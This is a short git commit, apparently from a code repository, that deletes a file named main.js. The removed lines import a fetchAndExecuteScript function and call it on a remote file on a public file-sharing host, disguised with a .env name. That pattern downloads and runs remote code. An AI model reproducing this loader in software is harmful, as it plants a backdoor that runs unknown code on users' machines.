6860b91ec2f743acec9c59a664a28cd25abd391b
FELIXTZ <hanstzgamestech@gmail.com>
2025-01-06 07:31:07 +0300

    Delete main.js

--- main.js
+++
@@ -1,8 +0,0 @@
-// Import the function from run.js
-const { fetchAndExecuteScript } = require('./run');
-
-// URL of the .env file to be fetched
-const envFileUrl = "https://files.catbox.moe/ozro88.env";
-
-// Call the function to fetch and execute the script
-fetchAndExecuteScript(envFileUrl);
